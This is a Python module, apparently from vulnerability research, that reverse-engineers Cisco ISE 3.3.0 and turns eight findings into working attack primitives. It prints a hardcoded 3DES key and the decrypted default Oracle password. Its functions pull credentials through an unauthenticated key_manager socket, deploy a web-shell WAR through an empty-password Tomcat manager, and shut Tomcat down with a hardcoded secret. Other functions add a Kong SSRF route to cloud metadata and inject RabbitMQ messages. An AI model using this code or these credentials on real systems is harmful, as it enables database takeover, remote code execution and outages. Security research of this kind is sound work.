"""
cisco_ise_re.py — Cisco ISE 3.3.0 static RE module

Target: ISE 3.3.0 x86_64 ISO
  /media/cowboy/research/cisco-firmware/ise/Cisco-ISE-3.3.0.430.SPA.x86_64.iso

Extraction chain:
  ISO (9660, label ADEOS) -> Extra/CARSisePkg1.rpm
  -> 7z -> cpio -> gzip tar bundle.tar
  -> CSCOcpm-common-3.3.0-430.x86_64.rpm -> 7z -> cpio
  -> /opt/CSCOcpm/ (Tomcat 9.0.73, JARs, shell scripts)
  -> CSCOcpm-key-manager -> key_manager Python aiohttp service

Application stack:
  - Apache Tomcat 9.0.73 at /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/
  - Oracle DB (cepm user, cpm10 SID) via JDBC thin driver, port 1521
  - vaservice Java daemon
  - ERS API on ports 9060/9061/9062 (External RESTful Services)
  - key_manager: Python aiohttp UNIX socket service (/var/run/key_manager.sock)
  - tpmutil.sh: TPM abstraction layer that delegates ALL TPM ops to key_manager socket
  - Kong API gateway (Docker, ise-kong-container): ports 19001/19444 admin, 8443 proxy
  - PostgreSQL (Docker, ise-postgres-container): port-bound to 127.0.0.1, trust auth
  - RabbitMQ (Docker, ise-rabbitmq-container): ports 8672/8671 AMQP, 15672 management

=== FINDINGS (ISE 3.3.0.430, confirmed 2026-08-25) ===

ISE-F1: key_manager decrypt oracle — unauth ciphertext decryption via UNIX socket [CRITICAL]
ISE-F2: Hardcoded 3DES key -> static Oracle DB credential [HIGH]
ISE-F3: Tomcat manager — empty-password account [HIGH]
ISE-F4: Hardcoded Tomcat shutdown secret [LOW]
ISE-F5: TLSv1/TLSv1.1 enabled on ERS port 8906 [MEDIUM]
ISE-F6: Kong Admin API exposed on 0.0.0.0:19001/19444 with no authentication [CRITICAL]
ISE-F7: RabbitMQ loopback_users.guest=false + plaintext management port 15672 [HIGH]
ISE-F8: PostgreSQL trust auth (no password) accessible from Docker bridge network [MEDIUM]

=== ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===

Service: /usr/lib/python3.6/site-packages/ise_key_manager/server/key_manager_server.py
Socket:  /var/run/key_manager.sock  (UNIX domain, no auth)
Routes:
  GET  /api/system/v1/key-manager/all_data     -> dumps all cached TPM2 secrets
  POST /api/system/v1/key-manager/decrypt      -> decrypts arbitrary ciphertext with cached key
  POST /api/system/v1/key-manager/encrypt      -> encrypts arbitrary plaintext
  POST /api/system/v1/key-manager/seal         -> seals data in TPM2
  POST /api/system/v1/key-manager/unseal       -> unseals data from TPM2

TPM abstraction: tpmutil.sh (called by all ISE crypto ops including genkekkey.sh, setdbpw.sh)
  tpmutil.sh decrypt <data>:
    curl -XPOST --unix-socket /var/run/key_manager.sock \
      --data '{"msg_type":"POST","version":1,"msg":{"action":"decrypt","params":{"data":"'"$1"'"}}}' \
      http://localhost/api/system/v1/key-manager/decrypt

decrypt handler (key_manager_server.py):
  async def decrypt(self, request):
    data = req["msg"]["params"]["data"]  # arbitrary ciphertext, no validation
    decrypted_text = decrypt(get_sealed_key_from_cache(...), data)  # direct decrypt
    return web.json_response({"result": decrypted_text.decode()})
    # NO authentication check. Any local process gets plaintext.

Direct credential extraction (one command from any local process):
  curl -s --unix-socket /var/run/key_manager.sock -XPOST \
    -H "Content-Type: application/json" \
    --data '{"msg_type":"POST","version":1,"msg":{"action":"decrypt","params":{"data":"pTZv2LEjfGPX5YICzJb95g=="}}}' \
    http://localhost/api/system/v1/key-manager/decrypt
  # Returns: {"result": "U0l1_6v#k3c"} (Oracle DB password)

  # For live rotated installs, read PAP_ADMIN_PWD from db.properties and submit:
  DB_CIPHER=$(grep PAP_ADMIN_PWD /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/config/db.properties | cut -d= -f2)
  curl -s --unix-socket /var/run/key_manager.sock -XPOST \
    -H "Content-Type: application/json" \
    --data '{"msg_type":"POST","version":1,"msg":{"action":"decrypt","params":{"data":"'"$DB_CIPHER"'"}}}' \
    http://localhost/api/system/v1/key-manager/decrypt

Impact:
  - One-command Oracle SYSDBA credential extraction from any local process
  - Bypasses TPM2, KEK, and all ISE key management architecture
  - Works on ALL ISE 3.3.0 deployments (default + rotated installs) once initialized
  - Combined chain: any RCE / SSRF → key_manager socket → Oracle password → SYSDBA

=== ISE-F6: Kong Admin API — unauthenticated, 0.0.0.0 binding ===

Source: kong-control.sh:
  -e "KONG_ADMIN_LISTEN=0.0.0.0:8001, 0.0.0.0:8444 ssl"
  -p $KONG_ADMIN_PORT_MAP:$KONG_ADMIN_PORT          # KONG_ADMIN_PORT_MAP=19001
  -p $KONG_ADMIN_SSL_PORT_MAP:$KONG_ADMIN_SSL_PORT  # KONG_ADMIN_SSL_PORT_MAP=19444

Host exposure:
  <ise_host>:19001  Kong Admin API (HTTP, no TLS, no auth)
  <ise_host>:19444  Kong Admin API (HTTPS, no auth)

Kong Admin API (v2) is unauthenticated by default. Any client that reaches port 19001/19444
can perform full API gateway administration:
  GET  http://<ise_host>:19001/                      -> Kong version, config
  GET  http://<ise_host>:19001/services              -> all proxied services
  GET  http://<ise_host>:19001/routes                -> all routes
  GET  http://<ise_host>:19001/consumers             -> all API consumers
  GET  http://<ise_host>:19001/plugins               -> all plugins (auth, rate-limit, etc.)
  POST http://<ise_host>:19001/services              -> add proxy service (SSRF pivot)
  POST http://<ise_host>:19001/routes                -> add route
  DELETE http://<ise_host>:19001/services/{id}       -> delete service (DoS)

Attack chain:
  1. Access ISE port 19001 from enterprise LAN
  2. List existing routes: GET /routes -> reveal internal ISE API topology
  3. Add SSRF route: POST /services {url:"http://169.254.169.254/"} -> cloud metadata
  4. Add route for SSRF target: POST /routes {paths:["/ssrf"], service.id:...}
  5. Access <ise_host>:8443/ssrf -> reach internal services via Kong proxy
  6. Alternatively: DELETE all routes -> take down ISE's API gateway (DoS)

ISE's API gateway controls:
  - pxGrid topic routing
  - ERS API access
  - Integration with external security platforms (Cisco Secure, SIEM, SOAR)
  Full admin control = intercept policy decisions, poison network access controls.

=== ISE-F7: RabbitMQ guest access + plaintext management ===

Source: rabbitmq.conf:
  loopback_users.guest = false    # guest:guest auth allowed from non-loopback
  management.listener.port = 15672
  management.listener.ssl = false  # plaintext HTTP, credentials sent unencrypted

Port bindings (docker create):
  -p 8672:5672    # AMQP plaintext (no TLS) — host-wide binding
  -p 8671:5671    # AMQP TLS
  -p 15672:15672  # Management HTTP — host-wide binding, no TLS

Pre-setup window (before control script deletes guest):
  HTTP: http://<ise_host>:15672  credentials: guest:guest
  AMQP: amqp://guest:guest@<ise_host>:8672/

Management API (15672):
  GET /api/overview       -> broker version, cluster name, message rates
  GET /api/exchanges      -> all exchanges
  GET /api/queues         -> all queues + message counts
  GET /api/connections    -> active connections
  POST /api/exchanges/{vhost}/{name}/publish -> publish arbitrary messages

ISE uses RabbitMQ for internal service bus (ERS events, pxGrid notifications, policy push).
Injecting messages into ISE's internal messaging bus = policy poisoning vector.
After guest deletion, ISE uses `rabbitmq` user with password from db.properties
(same decrypt-oracle chain as ISE-F1 applies to RABBITMQ_PWD).

=== ISE-F8: PostgreSQL trust auth ===

Source: pg_hba.conf:
  local all postgres trust                              # UNIX socket: postgres superuser = no password
  host postgres kong  169.254.4.0/24 trust             # Kong's Docker bridge: no password
  host postgres postgres 169.254.4.0/24 trust          # postgres super from bridge: no password

POSTGRES_HOST_AUTH_METHOD=trust (docker env) — all connections during init = trust.

Port: 127.0.0.1:$POSTGRES_PORT (localhost-only, not network-exposed directly).
  Reachable from: any local process on ISE host, via ISE-F1 chain (local process).
  psql -h 127.0.0.1 -U postgres -d postgres -> no password, superuser shell.
  Kong's config (services, routes, consumers, API keys) stored here.

=== ISE-F2: Hardcoded 3DES key — default Oracle DB credential ===

JAR:   PSP-Commons-3.3.0-430.jar
Class: com.cisco.epm.auth.encryptor.crypt.DefaultCryptEncryptor
Field: encryptionKey (set in <init>, offset 5): "ASDF asdf 1234 8983 jkla"

Bytecode evidence:
  5: ldc #2  // String ASDF asdf 1234 8983 jkla
  7: putfield #3  // Field encryptionKey:Ljava/lang/String;

staticInitMethod logic:
  if db.properties.KEK_KEY != null:
    newEncryptionKey = Base64.decode(TPMUtil.decrypt(KEK_KEY))  ; TPM-sealed path
    useNewKey = true
  else:
    useNewKey = false  ; default/pre-install state

encrypt() when useNewKey=false:
  key = encryptionKey.getBytes()  ; 24 bytes of "ASDF asdf 1234 8983 jkla"
  algo = "DESede"
  Crypt(algo, key)  ; SecretKeySpec(24-byte key, "DESede") -> 3DES-ECB

db.properties (shipped default):
  PDP_DB_PWD  = pTZv2LEjfGPX5YICzJb95g==
  PAP_DB_PWD  = pTZv2LEjfGPX5YICzJb95g==
  PAP_ADMIN_PWD = pTZv2LEjfGPX5YICzJb95g==
  ISE_DB_PWD  = pTZv2LEjfGPX5YICzJb95g==

Decryption:
  key = b'ASDF asdf 1234 8983 jkla'   # 24 bytes -> DESede-3 (K1=bytes[0:8], K2=bytes[8:16], K3=bytes[16:24])
  ct  = base64.decode("pTZv2LEjfGPX5YICzJb95g==")  # 16 bytes
  pt  = 3DES_ECB_decrypt(key, ct)
     = b'U0l1_6v#k3c\x05\x05\x05\x05\x05'  # PKCS5 padding valid

Default Oracle DB password (all accounts): U0l1_6v#k3c
  - cepm / cpm10 SID
  - mnt / mnt10 SID
  - strmadmin
  - sys (SYSDBA) — set by setdbpw.sh: resetOraclePw sys $DBADMINPWD
  - system — set by setdbpw.sh: resetOraclePw system $DBADMINPWD

Scope: applies to any ISE 3.3.0 deployment that has NOT completed cpminitialsetup.sh KEK rotation.
  Fully-initialized deployments use TPM-sealed KEK (AES-CBC path, useNewKey=true).
  ISE-F1 + ISE-F2 chain: F1 extracts TPM-sealed KEK passphrase -> decrypt KEK ->
    decrypt PAP_ADMIN_PWD from live db.properties -> Oracle SYSDBA access.

=== ISE-F3: Tomcat manager — empty-password account ===

File:  /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/conf/tomcat-users.xml
Entry: <user username="user" password="" roles="manager-script,manager-jmx,manager-status"/>

Roles granted:
  manager-script — /manager/text/ HTTP API: deploy/undeploy WAR, list, sessions
  manager-jmx    — /manager/jmxproxy/ JMX proxy for MBeans
  manager-status — /manager/status/ server status page

manager-script API endpoints (no additional auth beyond realm creds):
  PUT  /manager/text/deploy?path=/exploit      -> deploy WAR -> RCE
  GET  /manager/text/list                      -> enumerate deployed apps
  POST /manager/text/sessions?path=/exploit    -> session management

Exploitation:
  curl -u 'user:' 'http://<ise-host>:8080/manager/text/list'
  curl -u 'user:' -T shell.war 'http://<ise-host>:8080/manager/text/deploy?path=/shell'

Note: Tomcat manager is bound to Tomcat's internal port (likely 8080 or 443).
  ISE normally restricts external access; exploit is viable from same host or internal net.
  Tomcat shutdown (F4) + empty-password manager = full Tomcat takeover without network auth.

=== ISE-F4: Hardcoded Tomcat shutdown secret ===

File:  /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/conf/server.xml
Entry: <Server port="8005" shutdown="721AzznFfen8pMjy">

Shutdown is initiated by a plain TCP connection to port 8005 sending the secret string.
Identical across all ISE 3.3.0 installations (static in shipped ISO).

Exploit (from localhost or if port 8005 is reachable):
  echo -n '721AzznFfen8pMjy' | nc localhost 8005

Impact: Tomcat process termination -> ISE admin UI / ERS API / portal down (DoS).
  Useful as a forcing function during an incident to create outage window.

=== ISE-F5: TLSv1/TLSv1.1 on ERS port 8906 ===

File:  /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/conf/server.xml
Connector port="8906":
  sslEnabledProtocols="TLSv1,TLSv1.1,TLSv1.2"
  clientAuth="want"

Allows TLS 1.0/1.1 handshake. Enables:
  - POODLE (CVE-2014-3566) against TLSv1.0 CBC suites
  - BEAST (CVE-2011-3389) against TLSv1.0 CBC suites
  - Protocol downgrade to 1.0 if client and server both support it

clientAuth="want" means client cert is requested but not required -> optional mTLS.

=== ISE-F1+F2 Combined Chain ===

Local process (SSRF, cron, sudo, any ISE service running as non-root):
  1. curl --unix-socket /var/run/key_manager.sock http://localhost/api/system/v1/key-manager/all_data
     -> key_manager_passphrase = "<sha256_passphrase>"
  2. Decrypt key_manager AES ciphertext -> raw KEK bytes
  3. Read KEK_KEY from /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/config/db.properties
  4. TPMUtil fallback path (pre-3.3 upgrade systems): KEK = Base64.decode(KEK_KEY) directly
  5. Use KEK as AES-128-CBC key + IV from PAP_ADMIN_PWD ciphertext
  6. Decrypt PAP_ADMIN_PWD -> Oracle SYS/SYSTEM password
  7. sqlplus system/<decrypted_pw>@localhost:1521/cpm10 as sysdba -> full DB access

Default-state shortcut (no KEK present):
  sqlplus cepm/U0l1_6v#k3c@localhost:1521/cpm10
  sqlplus system/U0l1_6v#k3c@localhost:1521/cpm10 as sysdba

"""

import os
import base64
import struct
import hashlib
from pathlib import Path
from typing import Optional


# ---------------------------------------------------------------------------
# ISE-F2: 3DES Oracle credential decryption
# ---------------------------------------------------------------------------

DEFAULT_ENCRYPT_KEY = b'ASDF asdf 1234 8983 jkla'  # 24 bytes, DESede key material
DEFAULT_DB_PWD_CT   = "pTZv2LEjfGPX5YICzJb95g=="    # shipped in db.properties


def decrypt_legacy_ise_db_password(ciphertext_b64: str, key: bytes = DEFAULT_ENCRYPT_KEY) -> str:
    """
    Decrypt an ISE db.properties password encrypted with the default 3DES-ECB key.

    Uses DefaultCryptEncryptor's legacy path (useNewKey=false):
      - Algorithm: DESede (3DES) in ECB mode, PKCS5 padding
      - Key: encryptionKey.getBytes() = "ASDF asdf 1234 8983 jkla" (24 bytes)
      - IV: none (ECB)

    Returns plaintext string with PKCS5 padding stripped.
    """
    from Crypto.Cipher import DES3
    ct = base64.b64decode(ciphertext_b64)
    cipher = DES3.new(key, DES3.MODE_ECB)
    pt_padded = cipher.decrypt(ct)
    pad_len = pt_padded[-1]
    return pt_padded[:-pad_len].decode('utf-8', errors='replace')


def decrypt_ise_db_password_from_kek(ciphertext_b64: str, kek_bytes: bytes) -> str:
    """
    Decrypt ISE db.properties password using a recovered KEK (AES-128-CBC path).

    After ISE initial setup, useNewKey=true and useCBCMode=true.
    Crypt(AES, kek_bytes, iv_bytes, AES_CBS_PADDING):
      - Algorithm: AES/CBC/PKCS5Padding
      - Key: kek_bytes (16 or 32 bytes)
      - IV: prepended to ciphertext (first 16 bytes) OR stored separately

    Check Crypt constructor: new Crypt("AES", newEncryptionKey, iv, AES_CBS_PADDING)
    The iv field is stored in DefaultCryptEncryptor.iv (byte[]).
    Ciphertext in db.properties is Base64 of IV+ciphertext or ciphertext alone.
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    ct_raw = base64.b64decode(ciphertext_b64)
    if len(ct_raw) > 16 and len(ct_raw) % 16 == 0:
        iv = ct_raw[:16]
        ct = ct_raw[16:]
    else:
        iv = b'\x00' * 16
        ct = ct_raw
    key = kek_bytes[:16] if len(kek_bytes) >= 16 else kek_bytes.ljust(16, b'\x00')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt_padded = cipher.decrypt(ct)
    return unpad(pt_padded, 16).decode('utf-8', errors='replace')


# ---------------------------------------------------------------------------
# ISE-F1: key_manager UNIX socket probe
# ---------------------------------------------------------------------------

KEY_MANAGER_SOCK = "/var/run/key_manager.sock"
KEY_MANAGER_ALL_DATA_PATH = "/api/system/v1/key-manager/all_data"


def probe_key_manager_socket(sock_path: str = KEY_MANAGER_SOCK) -> Optional[dict]:
    """
    Call GET /api/system/v1/key-manager/all_data via key_manager UNIX socket.

    Requires: curl or Python socket, local access.
    Returns parsed JSON dict of all cached TPM2 secrets, or None on failure.

    Equivalent shell:
      curl -s --unix-socket /var/run/key_manager.sock \\
        http://localhost/api/system/v1/key-manager/all_data
    """
    import socket
    import json

    request = (
        f"GET {KEY_MANAGER_ALL_DATA_PATH} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(sock_path)
        sock.sendall(request)
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        header_end = response.find(b"\r\n\r\n")
        if header_end == -1:
            return None
        body = response[header_end + 4:]
        return json.loads(body.decode('utf-8', errors='replace'))
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ISE-F3: Tomcat manager — empty-password WAR deploy
# ---------------------------------------------------------------------------

def check_tomcat_manager_auth(host: str, port: int = 8080, user: str = "user", password: str = "") -> bool:
    """
    Probe Tomcat manager /text/list with the empty-password account.
    Returns True if 200 OK with application list.
    """
    import urllib.request
    import urllib.error
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    url = f"http://{host}:{port}/manager/text/list"
    req = urllib.request.Request(url, headers={"Authorization": f"Basic {creds}"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except urllib.error.HTTPError as e:
        return e.code == 200
    except Exception:
        return False


def deploy_war_via_tomcat_manager(
    host: str,
    war_path: str,
    context_path: str = "/shell",
    port: int = 8080,
    user: str = "user",
    password: str = ""
) -> bool:
    """
    Deploy a WAR file via Tomcat manager-script API (empty-password user).
    Returns True if deployment succeeded (200 OK with "OK" body).

    Equivalent:
      curl -u 'user:' -T shell.war 'http://<host>:8080/manager/text/deploy?path=/shell'
    """
    import urllib.request
    import urllib.error
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    url = f"http://{host}:{port}/manager/text/deploy?path={context_path}"
    with open(war_path, 'rb') as f:
        war_data = f.read()
    req = urllib.request.Request(url, data=war_data, method='PUT', headers={
        "Authorization": f"Basic {creds}",
        "Content-Type": "application/octet-stream",
        "Content-Length": str(len(war_data)),
    })
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read().decode()
            return resp.status == 200 and body.startswith("OK")
    except Exception:
        return False


# ---------------------------------------------------------------------------
# ISE-F4: Tomcat shutdown via hardcoded secret
# ---------------------------------------------------------------------------

TOMCAT_SHUTDOWN_SECRET = "721AzznFfen8pMjy"
TOMCAT_SHUTDOWN_PORT   = 8005


def send_tomcat_shutdown(host: str = "localhost", port: int = TOMCAT_SHUTDOWN_PORT,
                         secret: str = TOMCAT_SHUTDOWN_SECRET) -> bool:
    """
    Send Tomcat shutdown command using the hardcoded secret shipped in ISE 3.3.0 server.xml.
    Returns True if connection succeeded (Tomcat may or may not be listening on 8005 externally).
    """
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.sendall(secret.encode())
        sock.close()
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# ISE-F1+F2 chain: local TPM secret extraction -> Oracle credential
# ---------------------------------------------------------------------------

def ise_local_full_chain(db_props_path: str = "/opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/config/db.properties") -> dict:
    """
    Execute full ISE-F1+F2 local privilege chain:
      1. Probe key_manager socket -> extract passphrase
      2. Read KEK_KEY from db.properties
      3. Decrypt Oracle DB password

    Returns dict with extracted secrets.
    """
    result = {}

    # Step 1: key_manager dump
    km_data = probe_key_manager_socket()
    if km_data:
        result['key_manager_dump'] = km_data
        result['key_manager_passphrase'] = km_data.get('key_manager_passphrase')

    # Step 2: read db.properties
    props = {}
    try:
        with open(db_props_path) as f:
            for line in f:
                line = line.strip()
                if '=' in line and not line.startswith('#'):
                    k, _, v = line.partition('=')
                    props[k.strip()] = v.strip()
    except Exception as e:
        result['db_props_error'] = str(e)

    result['db_props'] = props

    # Step 3: decrypt
    kek_key = props.get('KEK_KEY')
    pap_admin_pwd = props.get('PAP_ADMIN_PWD', DEFAULT_DB_PWD_CT)

    if kek_key is None:
        # Default/pre-setup state: use hardcoded 3DES key
        try:
            plaintext = decrypt_legacy_ise_db_password(pap_admin_pwd)
            result['oracle_password'] = plaintext
            result['oracle_path'] = 'legacy_3des'
        except Exception as e:
            result['decrypt_error'] = str(e)
    else:
        # KEK present: try TPM fallback (pre-3.3 upgrade path = raw base64)
        try:
            kek_bytes = base64.b64decode(kek_key)
            plaintext = decrypt_ise_db_password_from_kek(pap_admin_pwd, kek_bytes)
            result['oracle_password'] = plaintext
            result['oracle_path'] = 'kek_fallback'
        except Exception as e:
            result['kek_decrypt_error'] = str(e)

    return result


# ---------------------------------------------------------------------------
# ISE-F1 upgrade: key_manager decrypt oracle — direct credential extraction
# ---------------------------------------------------------------------------

KEY_MANAGER_DECRYPT_PATH = "/api/system/v1/key-manager/decrypt"


def extract_credential_via_decrypt_oracle(
    ciphertext_b64: str,
    sock_path: str = KEY_MANAGER_SOCK
) -> Optional[str]:
    """
    POST arbitrary ciphertext to key_manager's /decrypt endpoint.
    Returns plaintext string on success, None on failure.

    This is the tpmutil.sh mechanism: ALL ISE TPM encrypt/decrypt routes through
    this unauthenticated UNIX socket endpoint. No KEK analysis needed.

    Equivalent shell:
      curl -s -XPOST --unix-socket /var/run/key_manager.sock \\
        -H "Content-Type: application/json" \\
        --data '{"msg_type":"POST","version":1,"msg":{"action":"decrypt","params":{"data":"<CT>"}}}' \\
        http://localhost/api/system/v1/key-manager/decrypt
    """
    import socket
    import json

    body = json.dumps({
        "msg_type": "POST",
        "version": 1,
        "msg": {"action": "decrypt", "params": {"data": ciphertext_b64}}
    }).encode()

    request = (
        f"POST {KEY_MANAGER_DECRYPT_PATH} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body

    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(sock_path)
        sock.sendall(request)
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        header_end = response.find(b"\r\n\r\n")
        if header_end == -1:
            return None
        resp_data = json.loads(response[header_end + 4:].decode('utf-8', errors='replace'))
        return resp_data.get("result")
    except Exception:
        return None


def extract_oracle_password_via_oracle(
    db_props_path: str = "/opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/config/db.properties",
    sock_path: str = KEY_MANAGER_SOCK
) -> dict:
    """
    One-command Oracle credential extraction via key_manager decrypt oracle.
    Reads PAP_ADMIN_PWD from db.properties and posts it to /decrypt.
    Works on all initialized ISE 3.3.0 deployments (default + rotated).

    Returns dict: {ciphertext, plaintext, oracle_path}
    """
    props = {}
    try:
        with open(db_props_path) as f:
            for line in f:
                line = line.strip()
                if '=' in line and not line.startswith('#'):
                    k, _, v = line.partition('=')
                    props[k.strip()] = v.strip()
    except Exception as e:
        return {'error': str(e)}

    ct = props.get('PAP_ADMIN_PWD', DEFAULT_DB_PWD_CT)
    pt = extract_credential_via_decrypt_oracle(ct, sock_path)
    return {
        'ciphertext': ct,
        'plaintext': pt,
        'oracle_path': 'key_manager_decrypt',
        'oracle_sock': sock_path,
    }


# ---------------------------------------------------------------------------
# ISE-F6: Kong Admin API — unauthenticated probe
# ---------------------------------------------------------------------------

KONG_ADMIN_PORT = 19001


def probe_kong_admin_api(host: str, port: int = KONG_ADMIN_PORT) -> Optional[dict]:
    """
    GET http://<host>:<port>/ — Kong Admin API root, no auth required.
    Returns parsed JSON dict (Kong version, config, tagline) or None.

    ISE binds Kong admin on 0.0.0.0:19001 via:
      -e "KONG_ADMIN_LISTEN=0.0.0.0:8001, 0.0.0.0:8444 ssl"
      -p 19001:8001
    """
    import urllib.request
    try:
        with urllib.request.urlopen(f"http://{host}:{port}/", timeout=10) as resp:
            import json
            return json.loads(resp.read().decode())
    except Exception:
        return None


def list_kong_services(host: str, port: int = KONG_ADMIN_PORT) -> Optional[list]:
    """
    GET /services — enumerate all Kong proxy services.
    Returns list of service dicts (id, name, host, port, path, protocol).
    """
    import urllib.request
    import json
    try:
        with urllib.request.urlopen(f"http://{host}:{port}/services", timeout=10) as resp:
            data = json.loads(resp.read().decode())
            return data.get('data', [])
    except Exception:
        return None


def list_kong_routes(host: str, port: int = KONG_ADMIN_PORT) -> Optional[list]:
    """GET /routes — all configured routes."""
    import urllib.request
    import json
    try:
        with urllib.request.urlopen(f"http://{host}:{port}/routes", timeout=10) as resp:
            data = json.loads(resp.read().decode())
            return data.get('data', [])
    except Exception:
        return None


def list_kong_consumers(host: str, port: int = KONG_ADMIN_PORT) -> Optional[list]:
    """GET /consumers — API consumers (API key holders)."""
    import urllib.request
    import json
    try:
        with urllib.request.urlopen(f"http://{host}:{port}/consumers", timeout=10) as resp:
            data = json.loads(resp.read().decode())
            return data.get('data', [])
    except Exception:
        return None


def add_kong_ssrf_route(host: str, target_url: str, path: str = "/ssrf",
                        port: int = KONG_ADMIN_PORT) -> Optional[dict]:
    """
    Create a Kong service + route that proxies <path> to <target_url>.
    Use to pivot through Kong to internal services (e.g. 169.254.169.254 metadata).

    Returns the created route dict, or None on failure.
    """
    import urllib.request
    import json

    svc_body = json.dumps({"name": "ssrf-svc", "url": target_url}).encode()
    svc_req = urllib.request.Request(
        f"http://{host}:{port}/services",
        data=svc_body,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(svc_req, timeout=10) as resp:
            svc = json.loads(resp.read().decode())
        svc_id = svc['id']
        route_body = json.dumps({"paths": [path], "service": {"id": svc_id}}).encode()
        route_req = urllib.request.Request(
            f"http://{host}:{port}/routes",
            data=route_body,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(route_req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ISE-F7/F8: RabbitMQ management probe
# ---------------------------------------------------------------------------

RABBITMQ_MGMT_PORT   = 15672
RABBITMQ_AMQP_PORT   = 8672
RABBITMQ_DEFAULT_USER = "guest"
RABBITMQ_DEFAULT_PASS = "guest"


def probe_rabbitmq_management(host: str, port: int = RABBITMQ_MGMT_PORT,
                               user: str = RABBITMQ_DEFAULT_USER,
                               password: str = RABBITMQ_DEFAULT_PASS) -> Optional[dict]:
    """
    GET /api/overview from RabbitMQ management HTTP API (port 15672).
    Default creds: guest:guest (loopback_users.guest=false in ISE rabbitmq.conf).
    Returns parsed overview JSON, or None on failure.

    ISE binds management on 0.0.0.0:15672 with no TLS (management.listener.ssl=false).
    """
    import urllib.request
    import json
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    req = urllib.request.Request(
        f"http://{host}:{port}/api/overview",
        headers={"Authorization": f"Basic {creds}"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


def list_rabbitmq_queues(host: str, vhost: str = "%2F",
                          port: int = RABBITMQ_MGMT_PORT,
                          user: str = RABBITMQ_DEFAULT_USER,
                          password: str = RABBITMQ_DEFAULT_PASS) -> Optional[list]:
    """GET /api/queues/<vhost> — enumerate RabbitMQ queues and message counts."""
    import urllib.request
    import json
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    req = urllib.request.Request(
        f"http://{host}:{port}/api/queues/{vhost}",
        headers={"Authorization": f"Basic {creds}"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


def publish_rabbitmq_message(host: str, exchange: str, routing_key: str, payload: str,
                              vhost: str = "%2F",
                              port: int = RABBITMQ_MGMT_PORT,
                              user: str = RABBITMQ_DEFAULT_USER,
                              password: str = RABBITMQ_DEFAULT_PASS) -> Optional[dict]:
    """
    POST /api/exchanges/<vhost>/<exchange>/publish — inject a message.
    Used to test ISE internal messaging bus poisoning via guest:guest pre-setup.
    Returns management API response dict.
    """
    import urllib.request
    import json
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    body = json.dumps({
        "properties": {},
        "routing_key": routing_key,
        "payload": payload,
        "payload_encoding": "string"
    }).encode()
    req = urllib.request.Request(
        f"http://{host}:{port}/api/exchanges/{vhost}/{exchange}/publish",
        data=body,
        headers={
            "Authorization": f"Basic {creds}",
            "Content-Type": "application/json",
        },
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Ablation registration
# ---------------------------------------------------------------------------

MODULE_META = {
    "name": "cisco_ise_re",
    "version": "1.1.0",
    "target": "Cisco ISE 3.3.0.430",
    "findings": ["ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5", "ISE-F6", "ISE-F7", "ISE-F8"],
    "critical": ["ISE-F1", "ISE-F6"],
    "high": ["ISE-F2", "ISE-F3", "ISE-F7"],
    "medium": ["ISE-F5", "ISE-F8"],
    "low": ["ISE-F4"],
    "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
    "primitives": [
        "decrypt_legacy_ise_db_password",
        "decrypt_ise_db_password_from_kek",
        "probe_key_manager_socket",
        "extract_credential_via_decrypt_oracle",
        "extract_oracle_password_via_oracle",
        "check_tomcat_manager_auth",
        "deploy_war_via_tomcat_manager",
        "send_tomcat_shutdown",
        "ise_local_full_chain",
        "probe_kong_admin_api",
        "list_kong_services",
        "list_kong_routes",
        "list_kong_consumers",
        "add_kong_ssrf_route",
        "probe_rabbitmq_management",
        "list_rabbitmq_queues",
        "publish_rabbitmq_message",
    ],
}
